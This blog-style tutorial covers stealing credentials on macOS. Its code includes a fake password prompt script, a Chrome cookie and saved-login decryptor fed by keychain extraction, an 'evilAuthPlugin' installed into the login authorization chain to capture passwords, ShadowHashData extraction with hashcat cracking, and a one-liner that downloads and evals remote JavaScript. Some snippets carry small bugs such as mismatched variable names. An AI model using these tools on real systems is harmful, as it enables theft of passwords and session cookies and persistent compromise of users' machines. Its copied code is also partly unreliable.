---
title: "credential access in macOS"
date: 2024-10-08T15:50:14-04:00
toc: true
next: true
nomenu: false
notitle: false
---

credential management in macOS is not dissimilar to that in Windows, but with some additional quirks. let's take a look at some of the ways they can be accessed, both legitimately and illegitimately.

## securityd

credentials are managed by the `securityd` process, and stored in the "keychain". `securityd` is a daemon (i.e. a background process) that maintains different security contexts and handles the various cryptographic operations in macOS. it manages access to the items in the keychain, as well as Security Authorizations.

`securityd` doesn't directly store the date, but it does route all access to keychain items (which is where passwords, encryption keys, and certificates) are all stored. this way, private keys remain out of the user process address space and access to the data is controlled by `securityd`. the authorization database, located at `/etc/authorization`, contains the rules that `securityd` enforces for various operations.

it's important to note that users don't interact directly with `securityd`. it's also important to note that `securityd` collaborates with other daemons to maintain the separation and security, like `trustd` for certificate validation and `nsurlsessiond` for real-time validity checks.

so, what exactly does it store?

### access management

as mentioned earlier, `securityd` manages access to the keychain, and is reponsible for the keychain's encryption. the keychain (which is implemented as a SQLite database stored on the file system) is encrypted using a [derived key](https://support.apple.com/en-ca/guide/security/secb0694df1a/web). the encryption key for the login keychain is derived from the user's password, and the key for the system keychain is known as a Master Key, which is stored separately from the keychain itself.

basically, `securityd` doesn't store the PBKDF2 value of the user's password directly, but it does manage a system of derived keys, access controls, and encryption to protect the contents of the keychain. the actual encryption keys are generated as needed and kept secure within the `securityd` process or hardware security modules.

in the old days [<v10.11], users could obtain task ports for native apps and processes. these task ports would give complete control of the process to whoever was requesting them, and would grant read/write access to process memory. then, SIP was introduced.

### SIP

SIP (**System Integrity Protection**) was designed to prevent malware from modifying protected files + folders. it protects several key system locations, like `/System`, `/usr` (but not `/usr/local`), `/bin`, `/sbin`, `/var`, and most pre-installed macOS apps. it restricts root access to these protected areas, thereby preventing code injection into system processes. it also limits runtime attachment and `DTrace` for protected executables, and sanitizes certain environment variables when calling system programs.

SIP is enabled by default, but it can be disabled (or bypassed). to check its status, just type the following into the terminal: `csrutil status`

for (legitimate) app developers, the method to get access to credentials is simple: prompts. however, this method isn't ideal for adversaries because it requires some level of elevated credentials. as always, we might be able to use this to our advantage. 

![alt text](/image-prompt.png)


## credential acces via prompts

users have become increasingly trained to authenticate to any popup on their machine. this leads us to an obvious next-step: create custom popup messages to ask for authentication, and record the credentials entered. 

first, set up the scripting environment by initializing `osascript` with javascript. 

```bash
osascript -l JavaScript -i
```

inside the new environment, create an `app` object that represents the current application and enables standard additions, which allows us to use the dialog functions.

```js
let app = Application.currentApplication()
app.includeStandardAdditions = true
```

now, for the main function. in OSA JavaScript, the `run()` function is the entry point of the script.


```js
function run() {

}
```

using shell commands, get the user's full name + username.

```js
const fullName = app.doShellScript('id -F')
const username = app.doShellScript('whoami')
```

define the title, text, default answer, and icon for the dialog. these will be displayed to the user.

```js
const title = `Hello ${fullname}`
const text = `Hi ${username}, please enter your password:`
const answer = ""
const icon = "caution"
```

display the dialog, and wrap it in a try-catch block to handle cancellations or errors.

```js
try {
    let propmpt = app.displayDialog(text, {
        defaultAnswer: answer,
        buttons: ['OK', 'Cancel'],
        defaultButton: 'OK',
        cancelButton: 'Cancel',
        withTitle: title,
        withIcon: icon,
        hiddenAnswer: true
    })
} catch (err){
    // handle errors
}
```

the user should now enter their input (password) and click OK. if they click OK, this next bit will capture their input, display a confirmation, and return the input.

```js
if (prompt.buttonReturned === 'OK') {
    const userInput = prompt.textReturned
    app.displayAlert(`Password entered`, {
        message: `${fullName}, your password has been securely recorded.`,
        as: "informational"
    })
    return userInput
}
```

the next bit is something that should never happen: display the password as a "debugging" comment.

```js
if (result !== null) {
    app.displayDialog(`Debug: The entered password was "${result}"`)
}
```

here it is in action.

![prompted](/credential-prompt.png)

![recorded](/credential-recorded.png) 

![revealed](/credential-revealed.png) 

here's the full code if you want to try it yourself!

```js
let app = Application.currentApplication()
app.includeStandardAdditions = true

function run() {
    // Get the current user's full name
    const fullName = app.doShellScript('id -F')
    
    // Get the current user's username
    const username = app.doShellScript('whoami')

    const title = `Hello ${fullName}`
    const text = `Hi ${username}, please enter your password:`
    const answer = ""
    const icon = "caution"

    try {
        let prompt = app.displayDialog(text, {
            defaultAnswer: answer,
            buttons: ['OK', 'Cancel'],
            defaultButton: 'OK',
            cancelButton: 'Cancel',
            withTitle: title,
            withIcon: icon,
            hiddenAnswer: true
        })

        if (prompt.buttonReturned === 'OK') {
            const userInput = prompt.textReturned
            app.displayAlert(`Password entered`, {
                message: `${fullName}, your password has been securely recorded.`,
                as: "informational"
            })
            return userInput  // This will be the result of the run() function
        }
    } catch (err) {
        if (err.errorNumber === -128) {
            app.displayAlert("Dialog cancelled", {
                message: `${fullName}, you cancelled the password entry.`,
                as: "warning"
            })
        } else {
            throw err
        }
    }
    return null  // Return null if cancelled or an error occurred
}

// Execute the function and store the result
const result = run()

// Display the result (be careful with this in a real scenario!)
if (result !== null) {
    app.displayDialog(`Debug: The entered password was "${result}"`)
}
```

## credential access via chrome cookies

browser cookies are a highly valuable vector for attackers. cookies contain session identifiers that allow users to stay logged in, so if an attacker [steals them](https://eitca.org/cybersecurity/eitc-is-wasf-web-applications-security-fundamentals/session-attacks/cookie-and-session-attacks/examination-review-cookie-and-session-attacks/how-can-an-attacker-steal-a-users-cookies-using-a-http-get-request-embedded-in-an-image-source/), they can impersonate the user without needing credentials. 

armed with valid session cookes, attackers can also [bypass MFA](https://www.techtarget.com/searchsecurity/definition/cookie-poisoning) because the system assumes the user has already completed the MFA process. let's see how we can steal some cookies!

### cookie locations

the "big 3" browsers store their cookies in different locations.

```
safari: ~/Library/Safari/LocalStorage/*
firefox: ~/Library/Application Support/Firefox/Profiles/*.default/cookies.sqlite
chrome: ~/Library/Application Support/Google/Chrome/Default/Cookies
```

### key retrieval

chrome encrypts important user data files (cookies, passwords, payment information, authentication tokens) with a key stored in the user's login keychain. this key is stored under `Chrome Safe Storage` in the keychain, and is base64 encoded.

to retrieve the key, just use the following command: `security find-generic-password -wa "Chrome Safe Storage"`

this retrieved key can be used directly in the base64-encoded form for decryption operations.

### extraction

using [chainbreaker](https://github.com/n0fate/chainbreaker), you can extract a bunch of information from your macOS keychain. all you have to do is provide the path to your login keychain (usually at `~/Library/Keychains/login.keychain-db`), and chainbreaker will output a bunch of decrypted information.

```bash
python3 -m chainbreaker -pa ~/Library/Keychains/login.keychain-db -o output

grep -C 20 "Chrome Safe Storage" output.log

[+] Generic Password Record
	 [-] Create DateTime: 2023-11-15 18:32:14
	 [-] Last Modified DateTime: 2023-11-15 18:32:14
	 [-] Description: 
	 [-] Creator: b'aapl'
	 [-] Type: 
	 [-] Print Name: b'Chrome Safe Storage'
	 [-] Alias: 
	 [-] Account: b'Chrome'
	 [-] Service: b'Chrome Safe Storage'
	 [-] Base64 Encoded Password: b'<redacted>'
```

### decryption

using the base64 safe storage key, and the following script, you can decrypt the cookies + login data, and get a JSON output. you'll need to provide the path to your login data: `login_data = ~/Library/Application Support/Google/Chrome/Default/Login Data`

```python
import sqlite3
import os.path
import base64
import urllib.parse
import sys
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2


salt = b'saltysalt'
cookie_path = ""
login_data = ""
chrome_secret = ""
iv = b' ' * 16
length = 16

def chrome_decrypt(encrypted_value, key=None):

    # Encrypted cookies should be prefixed with 'v10' according to the
    # Chromium code. Strip it off.
    encrypted_value = encrypted_value[3:]

    # Strip padding by taking off number indicated by padding
    # eg if last is '\x0e' then ord('\x0e') == 14, so take off 14.
    # You'll need to change this function to use ord() for python2.
    def clean(x):
        return x[:-x[-1]].decode('utf8')

    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(encrypted_value)

    return clean(decrypted)
my_pass = chrome_secret.encode('utf8')
#my_pass = my_pass.encode('utf8')
iterations = 1003
cookie_file = os.path.expanduser(cookie_path)

# Generate key from values above
key = PBKDF2(my_pass, salt, length, iterations)

def diagnose_database(db_path):
    try:
        if not os.path.exists(db_path):
            print(f"Error: The file {db_path} does not exist.")
            return

        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Check if the file is a valid SQLite database
        cursor.execute("SELECT sqlite_version();")
        version = cursor.fetchone()
        if version:
            print(f"Valid SQLite database. Version: {version[0]}")
        else:
            print("The file doesn't appear to be a valid SQLite database.")
            return

        # List all tables in the database
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = cursor.fetchall()
        if tables:
            print("Tables in the database:")
            for table in tables:
                print(f"- {table[0]}")
                # Print schema for each table
                cursor.execute(f"PRAGMA table_info({table[0]})")
                columns = cursor.fetchall()
                print("  Columns:")
                for column in columns:
                    print(f"    {column[1]} ({column[2]})")
        else:
            print("No tables found in the database.")

    except sqlite3.Error as e:
        print(f"SQLite error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        if conn:
            conn.close()

if cookie_path != "":
    try:
        conn = sqlite3.connect(cookie_file)
        cursor = conn.cursor()

        # Check if the 'cookies' table exists
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies';")
        if cursor.fetchone() is None:
            print(f"Error: The 'cookies' table doesn't exist in the database: {cookie_file}")
            print("Available tables:")
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            for table in tables:
                print(table[0])
        else:
            sql = 'select name, value, encrypted_value, path, host_key, expires_utc, is_httponly, samesite, is_secure, priority, last_access_utc, is_persistent, has_expires, source_scheme from cookies'
            cookies = {}
            cookies_list = []
            
            try:
                for k, v, ev, path, domain, expirationDate, httpOnly, samesite, secure, priority, last_access, is_persistent, has_expires, source_scheme in conn.execute(sql):
                    temp_val = {"name": k, "value": v, "path": path, "domain": domain, "expirationDate": expirationDate, "httpOnly": httpOnly, "samesite": samesite, "secure": secure, "id": priority, "session": is_persistent, "hostOnly": False, "storeId":"firefox-default", "sameSite":"no_restriction","firstPartyDomain":""}
                    temp_val["httpOnly"] = False if httpOnly == 0 else True
                    temp_val["secure"] = False if secure == 0 else True
                    temp_val["session"] = not bool(is_persistent)
                    
                    if v or (ev[:3] != b'v10'):
                        pass
                    else:
                        temp_val['value'] = chrome_decrypt(ev, key=key)
                    cookies_list.append(temp_val)
                
                print(json.dumps(cookies_list, sort_keys=True, indent=4))
            except sqlite3.OperationalError as e:
                print(f"Error executing SQL: {e}")
                print("Columns in the 'cookies' table:")
                cursor.execute("PRAGMA table_info(cookies);")
                columns = cursor.fetchall()
                for column in columns:
                    print(column[1])  # Print column name
    except sqlite3.Error as e:
        print(f"SQLite error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        if conn:
            conn.close()
else:
    print("Cookie path is empty. Please provide a valid path.")
if login_data != "":
    fd = os.open(login_data, os.O_RDONLY) #open as read only
    database = sqlite3.connect('/dev/fd/%d' % fd)
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                continue
            else:
                print("Working on url: {}".format(url))
                urlUserPassDecrypted = (url, user, chrome_decrypt(encryptedPass, key=key))
                decryptedList.append(urlUserPassDecrypted)
    print(json.dumps(decryptedList, sort_keys=True, indent=4))

if __name__ == "__main__":
    cookie_path = "Cookies3"  # Update this to the correct path
    
    print(f"Diagnosing database: {cookie_path}")
    diagnose_database(cookie_path)
```

## credential access via authorization plugins

authorization plugins (located in `/Library/Security/SecurityAgentPlugins`) extend the authentication system in macOS by allowing custom authentication methods to be integrated into the standard login process. `securityd` works with these plugins to handle authentication requests, by communicating with `SecurityAgent`, which loads + uses these plugins.

the plugins can implement custom authentication methods (biometric, 3rd-party IdPs) and so must be carefully designed and implemented. 

### `auth.db`

the authorization database (located at `/var/db/auth.db`) controls all the rules, policies, and plugins that are used when requests are processed via `securityd`. you can dump the information in this database by providing a "right-name" (check out the full list [here](https://www.dssw.co.uk/reference/authorization-rights/)): `security authorizationdb read <right-name>`

```bash
$ security authorizationdb read allow
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>class</key>
	<string>allow</string>
	<key>comment</key>
	<string>Allow anyone.</string>
	<key>created</key>
	<real>719346785.95490503</real>
	<key>modified</key>
	<real>719346785.95490503</real>
	<key>version</key>
	<integer>0</integer>
</dict>
</plist>
YES (0)

$ security authorizationdb read authenticate-session-owner-or-admin
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>allow-root</key>
	<false/>
	<key>authenticate-user</key>
	<true/>
	<key>class</key>
	<string>user</string>
	<key>comment</key>
	<string>Authenticate either as the owner or as an administrator.</string>
	<key>created</key>
	<real>719346785.95490503</real>
	<key>group</key>
	<string>admin</string>
	<key>modified</key>
	<real>719346785.95490503</real>
	<key>session-owner</key>
	<true/>
	<key>shared</key>
	<false/>
	<key>timeout</key>
	<integer>2147483647</integer>
	<key>tries</key>
	<integer>10000</integer>
	<key>version</key>
	<integer>0</integer>
</dict>
</plist>
YES (0)
```

### authorization rights

these are known as authorization rights. as you can see, they have a `class` key that has three possible values: `user`, `rule`, `evaluate-mechanisms`. the latter is a complex series of programmatic checks.

an important right that i'll look at is `system.login.console`. this controls access to console login on macOS. the `loginwindow` process tries to obtain this right during the login process, and sysadmins usually modify this right to add custom authC/authZ steps during login. it's structured as a `plist` containing various keys, and modifying it can yield some pretty powerful effects.

```bash
$ security authorizationdb read system.login.console               
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>class</key>
	<string>evaluate-mechanisms</string>
	<key>comment</key>
	<string>Login mechanism based rule.  Not for general use, yet.</string>
	<key>created</key>
	<real>719346785.95490503</real>
	<key>mechanisms</key>
	<array>
		<string>builtin:prelogin</string>
		<string>builtin:policy-banner</string>
		<string>loginwindow:login</string>
		<string>builtin:login-begin</string>
		<string>builtin:reset-password,privileged</string>
		<string>loginwindow:FDESupport,privileged</string>
		<string>builtin:forward-login,privileged</string>
		<string>builtin:auto-login,privileged</string>
		<string>builtin:authenticate,privileged</string>
		<string>PKINITMechanism:auth,privileged</string>
		<string>builtin:login-success</string>
		<string>loginwindow:success</string>
		<string>HomeDirMechanism:login,privileged</string>
		<string>HomeDirMechanism:status</string>
		<string>MCXMechanism:login</string>
		<string>CryptoTokenKit:login</string>
		<string>loginwindow:done</string>
	</array>
	<key>modified</key>
	<real>719346785.95490503</real>
	<key>shared</key>
	<true/>
	<key>tries</key>
	<integer>10000</integer>
	<key>version</key>
	<integer>11</integer>
</dict>
</plist>
YES (0)
```

the `mechanisms` array has a format of `<plugin>:<mechanism>`, and occasionally `,privileged`, which means it runs as root. all these mechanisms need to return `kAuthorizationResultAllow`, otherwise the entire process fails. each plugin in this list gets called in order, as well.


the two main components of authorization in macOS are a user-and-owner model from BSD that applies to files + folders, and policy-based authorization requests for greater granularity. appls pass a list of requested rights to the Security Server which compares them against the authorization database. if there's no valid cache entry, users might have to authenticate.


you can track rules + rights requested for certain actions, which is useful to see which rights are needed where.

```bash
$ sudo log show --style syslog --predicate 'subsystem == "com.apple.Authorization" && eventMessage CONTAINS[c] "validating credential"' --last 8h
Filtering the log data using "subsystem == "com.apple.Authorization" AND composedMessage CONTAINS[c] "validating credential""

Skipping info and debug messages, pass --info and/or --debug to include.

Timestamp                       (process)[PID]    
2024-10-10 09:21:47.878819-0400  localhost authd[445]: [com.apple.Authorization:authd] Validating credential bilal (501) for use-login-window-ui (engine 3299)
```

it's becoming increasingly likely that we can install our own authorization plugin into a system. first, i need to dump a copy of the right that i need (`system.login.console`): `security authorizationdb read system.login.console > poc.plist`.

### custom authorization plugin

since i want to create my own plugin and add it to the list after the user's password is confirmed (by `HomeDirMechanism` returning `true`), i'll need to craft some code and use the functions `AuthorizationRightGet` and `AuthorizationRightSet`. modifying the code taken from [here](https://github.com/alex030/UserConfigAgent/blob/42e3d786d52604b3cfbcdf8c77320093684626d7/UserConfigAgentPlugin/main.m) (which is a UserConfigAgent program written in Objective-C), it should allow us to create an implant that will store the user's password when they log back in.

this is the `main.m` function of the `evilAuthPlugin` [program](https://github.com/xorrior/macOSTools/tree/master/auth_plugins/evilAuthPlugin). you can modify the `MechanismInvoke()` function to perform any action, but for now it just saves the user's password to `/private/tmp/password.txt`.

```objc
#import <Foundation/Foundation.h>
#import <Security/AuthorizationPlugin.h>
#include <Security/AuthSession.h>
#include <Security/AuthorizationTags.h>
#include <CoreServices/CoreServices.h>
#include "Common.h"
#include <syslog.h>
#include <unistd.h>


#define kKMAuthAuthorizeRight "authorize-right"
#define kMechanismMagic "MLSP"
#define kPluginMagic "PlgN"

struct PluginRecord {
    OSType                          fMagic;         // must be kPluginMagic
    const AuthorizationCallbacks *  fCallbacks;
};

typedef struct PluginRecord PluginRecord;

struct MechanismRecord {
    OSType                          fMagic;         // must be kMechanismMagic
    AuthorizationEngineRef          fEngine;
    const PluginRecord *            fPlugin;
    Boolean                         fWaitForDebugger;
};

typedef struct MechanismRecord MechanismRecord;

NSString *GetStringFromContext(struct MechanismRecord *mechanism, AuthorizationString key) {
    const AuthorizationValue *value;
    AuthorizationContextFlags flags;
    OSStatus err = mechanism->fPlugin->fCallbacks->GetContextValue(mechanism->fEngine, key, &flags, &value);
    if (err == errSecSuccess && value->length > 0) {
        NSString *s = [[NSString alloc] initWithBytes:value->data
                                            length:value->length
                                             encoding:NSUTF8StringEncoding];
        return [s stringByReplacingOccurrencesOfString:@"\0" withString:@""];
    }
    return nil;
}


NSString *GetStringFromHint(MechanismRecord *mechanism, AuthorizationString key) {
    const AuthorizationValue *value;
    OSStatus err = mechanism->fPlugin->fCallbacks->GetHintValue(mechanism->fEngine, key,&value);
    if (err == errSecSuccess && value->length > 0) {
        NSString *s = [[NSString alloc] initWithBytes:value->data
                                               length:value->length
                                             encoding:NSUTF8StringEncoding];
        return [s stringByReplacingOccurrencesOfString:@"\0" withString:@""];
    }
    return nil;
}

OSStatus AllowLogin(MechanismRecord *mechanism) {
    return mechanism->fPlugin->fCallbacks->SetResult(mechanism->fEngine,kAuthorizationResultAllow);
}

OSStatus MechanismCreate(AuthorizationPluginRef inPlugin,AuthorizationEngineRef inEngine,AuthorizationMechanismId mechanismId,AuthorizationMechanismRef *outMechanism) {
    MechanismRecord *mechanism = (MechanismRecord *)malloc(sizeof(MechanismRecord));
    if (mechanism == NULL) return errSecMemoryError;
    mechanism->fMagic = kMechanismMagic;
    mechanism->fEngine = inEngine;
    mechanism->fPlugin = (PluginRecord *)inPlugin;
    *outMechanism = mechanism;
    return errSecSuccess;
}

OSStatus MechanismDestroy(AuthorizationMechanismRef inMechanism) {
    free(inMechanism);
    return errSecSuccess;
}

OSStatus MechanismInvoke(AuthorizationMechanismRef inMechanism) {
    MechanismRecord *mechanism = (MechanismRecord *)inMechanism;
    @autoreleasepool {
        
        // Make sure this is not a hidden user.
        
        NSString *username = GetStringFromContext(mechanism, kAuthorizationEnvironmentUsername);
        NSString *password = GetStringFromContext(mechanism, kAuthorizationEnvironmentPassword);
        // NSString *sesOwner = GetStringFromHint(mechanism, kKMAuthSuggestedUser);
        NSString *AuthAuthorizeRight = GetStringFromHint(mechanism, kKMAuthAuthorizeRight);
        
        // Make sure we have username and password data.
        if (!username || !password) {
            return AllowLogin(mechanism);
        }
        
        BOOL keychainPasswordValid = YES;
        
        SecKeychainSetUserInteractionAllowed(NO);
        keychainPasswordValid = ValidateLoginKeychainPassword(password);
        // Revert back to the default ids
        pthread_setugid_np(KAUTH_UID_NONE, KAUTH_GID_NONE);
        
        //NSData *passwordData = [NSKeyedArchiver archivedDataWithRootObject:password];
        if (keychainPasswordValid) {
            [password writeToFile:@"/private/tmp/password.txt" atomically:TRUE encoding:NSUTF8StringEncoding error:NULL];
        }
    }
    
    return AllowLogin(mechanism);
}

OSStatus MechanismDeactivate(AuthorizationMechanismRef inMechanism) {
    MechanismRecord *mechanism = (MechanismRecord *)inMechanism;
    return mechanism->fPlugin->fCallbacks->DidDeactivate(mechanism->fEngine);
}

OSStatus PluginDestroy(AuthorizationPluginRef inPlugin) {
    free(inPlugin);
    return errSecSuccess;
}

OSStatus AuthorizationPluginCreate(
                                   const AuthorizationCallbacks *callbacks,
                                   AuthorizationPluginRef *outPlugin,
                                   const AuthorizationPluginInterface **outPluginInterface) {
    PluginRecord *plugin = (PluginRecord *)malloc(sizeof(PluginRecord));
    if (plugin == NULL) return errSecMemoryError;
    plugin->fMagic = kPluginMagic;
    plugin->fCallbacks = callbacks;
    *outPlugin = plugin;
    
    static AuthorizationPluginInterface pluginInterface = {
        kAuthorizationPluginInterfaceVersion,
        &PluginDestroy,
        &MechanismCreate,
        &MechanismInvoke,
        &MechanismDeactivate,
        &MechanismDestroy
    };
    *outPluginInterface = &pluginInterface;
    
    return errSecSuccess;
}
```

opening the project in XCode, there are some housekeeping items to be performed first.

![alt text](/plugin-info.png)

the `info.plist` shows the high-level details of the plugin, including the bundle name and bundle identifier. we'll change this to be something a little more innocuous.

![alt text](/plugin-name.png) 
 
![alt text](/plugin-bundleID.png)

note: the bundle name and identifier should match. 

build the project in XCode (Product -> Build), and then access the build via the Products directory on the left. when you find it in Finder, compress it and copy it over to the `/Library/Security/SecurityAgentPlugins` directory. once it's copied over, unzip it into the directory.

```bash
$ sudo cp evilAuthPlugin.bundle.zip /Library/Security/SecurityAgentPlugins

$ sudo unzip evilAuthPlugin.bundle.zip             
Archive:  evilAuthPlugin.bundle.zip
   creating: evilAuthPlugin.bundle/
   creating: evilAuthPlugin.bundle/Contents/
   creating: evilAuthPlugin.bundle/Contents/_CodeSignature/
   creating: evilAuthPlugin.bundle/Contents/MacOS/
  inflating: evilAuthPlugin.bundle/Contents/Info.plist  
  inflating: evilAuthPlugin.bundle/Contents/_CodeSignature/CodeResources  
  inflating: evilAuthPlugin.bundle/Contents/MacOS/evilAuthPlugin  
```

before proceeding, we have to modify the `poc.plist` file. add the following line: `<string>BundleName:login,privileged</string>` to the file, so that it looks like this.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>class</key>
	<string>evaluate-mechanisms</string>
	<key>comment</key>
	<string>Login mechanism based rule.  Not for general use, yet.</string>
	<key>created</key>
	<real>719346785.95490503</real>
	<key>mechanisms</key>
	<array>
		<string>builtin:prelogin</string>
		<string>builtin:policy-banner</string>
		<string>loginwindow:login</string>
		<string>builtin:login-begin</string>
		<string>builtin:reset-password,privileged</string>
		<string>loginwindow:FDESupport,privileged</string>
		<string>builtin:forward-login,privileged</string>
		<string>builtin:auto-login,privileged</string>
		<string>builtin:authenticate,privileged</string>
		<string>PKINITMechanism:auth,privileged</string>
		<string>builtin:login-success</string>
		<string>loginwindow:success</string>
		<string>HomeDirMechanism:login,privileged</string>
		<string>HomeDirMechanism:status</string>
		<string>BundleName:login,privileged</string>
		<string>MCXMechanism:login</string>
		<string>CryptoTokenKit:login</string>
		<string>loginwindow:done</string>
	</array>
	<key>modified</key>
	<real>719346785.95490503</real>
	<key>shared</key>
	<true/>
	<key>tries</key>
	<integer>10000</integer>
	<key>version</key>
	<integer>11</integer>
</dict>
</plist>
```

update the authorization database.

```bash
security authorizationdb write system.login.console < poc.plist      
YES (0)
```

you can force logout the user via the following command.

```bash
sudo launchctl bootout user/$(id -u <username>)
```

when they log back in, the code will have executed and the password will be at `/private/tmp/password.txt`!

just some notes on this method, if you're experimenting: modifying the login process is quite risky, and potentially dangerous. if you're not sure what you're doing, you could prevent anybody from logging in (including yourself) via the login screen.

## credential access via ShadowHashData

`ShadowHashData` is a mechanism in macOS used to store hashed password data for user accounts. it's stored as binary `.plist` files for each user account in `/var/db/dslocal/nodes/Default/users/`. 

you can extract it via `default` or `dscl` utilities.

```bash
$ sudo dscl . read /Users/$USERNAME ShadowHashData

dsAttrTypeNative:ShadowHashData:
 62706c69 73743030 d2010203 0a5f101e 5352502d 52464335 3035342d 34303936 2d534841 3531322d 50424b44 46325f10 1453414c 5445442d 53484135 31322d50 424b4446 32d30405 06070809 58766572 69666965 72547361 6c745a69 74657261 74696f6e 734f1102 004350d6 29ecef1f 122a15ae ee030fa6 fa552525 6994b148 c9bdb3e0 bb652c88 0b82b334 4886ac55 9f04e045 bb494aea e73a5914 b68eb607 fd812f54 1c6ce2f5 c773be52 77c471bc 89df7ebd 0a0298b9 aa407330 e92816bf 732c10b0 09922f04 628fe872 b1b37778 0bd8221c d3487bee 42cf6a15 67802d13 4db26656 d0f2c17f 7c3ed954 c9fe56b8 615553a7 931ec655 4f526f5c c4541874 795b9b77 ce69d038 3380f493 c49d84ce 6e3f5d1c 0bb3df13 8bb379fb 99473936 817ba675 0409b97d 7026ab75 3778473c a51926a2 b1745b72 28285997 524e7ef0 4821f41e f6e1979f 88c0a2c1 103773d4 cc69b5e5 0515be57 7c901e6b 3abae24f 7716b146 c3763881 d1c41f79 3dee9577 3f66f969 db2ab6bb 331bd518 438e1d56 1e314fa1 c78ea486 ff7f09db 5bb94565 5406ff15 597396cb 6b4832bf 2baab2e8 3f9ed76f e6c0e11a 130f5403 59c2b47c 33b78f4f 0b969805 47ff5030 149a94e7 37fcf4a4 1d6e1837 d31e26ff 6c4de92f 5c0bce93 d9498299 a0d15668 2557da09 748c24a0 c20bc995 8b119c85 92f8c319 f17ac5c8 6631b9d8 11803fb6 ca2af51b 3ab52af7 354f61e1 87dcc684 57259217 32343cdd 200ec9bd fdb38f6a 3ffb135c 3d095b3d e40ac620 a3975056 ca8ee84a 175198b0 8c471e54 d2637140 eaaf40a8 673c8f70 b5fc4033 77a46b8b 0c65a69f 3817b8de fa028a7c 146705d6 1000652c dd4a6dce bf0d7aaf 2a4f1020 ba98c293 c1461cf9 c4df9952 569b14b9 1ff176e0 eddaee7c a4583f2d 097287c1 1200022e 09d30b05 060c0d09 57656e74 726f7079 4f1080e9 a36c9b06 438acd06 8982b946 ffa90aac e01574e3 cf98628c 4348784e 1630f0de 9e018c55 77d5d376 cc335136 57d3a593 e1fa565c 53b4a3fd 7dc1599e 2e60b3e1 f815a1d2 612f86cf 6e26d143 a0f202cc 5c0182a9 ea973682 cfd7859e 82ebc85b abdc8be1 845d26ce bb4a3594 f1654b86 e8476c4e 7d566916 0ae8c052 3491a94f 10205a83 6c31ba4a a34077d9 67368267 d314ddfa 2808e96e 6b58119a 26df3f67 c8c40008 000d002e 0045004c 0055005a 00650269 028c0291 029802a0 03230000 00000000 02010000 00000000 000e0000 00000000 00000000 00000000 0346
```

this contains the hashing algorithm (like PBKDF2), the number of iterations, the salt, and **entropy** (i.e. the actual hashed password.)

you can attempt to crack this using `hashcat`, with the form `$ml$[iterations]$[salt]$[entropy]`, but this will be painfully slow.

instead, we can use [Orchard](https://github.com/its-a-feature/Orchard/blob/master/Orchard.js) to leverage JXA (JavaScript for Automation) to do some enumeration.

set up a scripting environment:

```bash
$ osascript -l JavaScript -i
```

then enter the following command:

```js
>> eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://raw.githubusercontent.com/its-a-feature/Orchard/master/Orchard.js')),$.NSUTF8StringEncoding)));
```

you can now call functions inside this environment. for example, i want to get my local user data.

```js
Get_LocalUser({user:"bilal"})
```

![alt text](/shadow.png)

the output here is massive. i'm interested in `dsAttrTypeNative:ShadowHashData`, which manifests as a base64 blob. it's easier to save the output to a file, then `grep` it.

```js
Get_LocalUser({user:"bilal"}) > user_data.json
```

```bash
grep -A1 "dsAttrTypeNative:ShadowHashData" user_data.json
```

once you collect the base64 blob above, feed it into the command below and decode it.

```bash
echo <blob> | base64 -D > shadowhash.bplist
```

convert the `plist` to XML. 

```bash
plutil -convert xml1 shadowhash.bplist
```

we'll need the salt (`SALTED-SHA512-PBKDF2`) and entropy sections, and in hex, so let's convert them.

```bash
echo <salt> | base64 -D > salt

xxd -p salt | tr -d '\n'
```

now that we have all the parts, create a hash file for cracking. remember the format: `$ml$iterations$salt$entropy`.

the hashcat command to crack the password is simple, and all you need is a reliable password list (`rockyou.txt`).

```bash
hashcat -m 7100 <hash-file> ~/tools/rockyou.txt
```

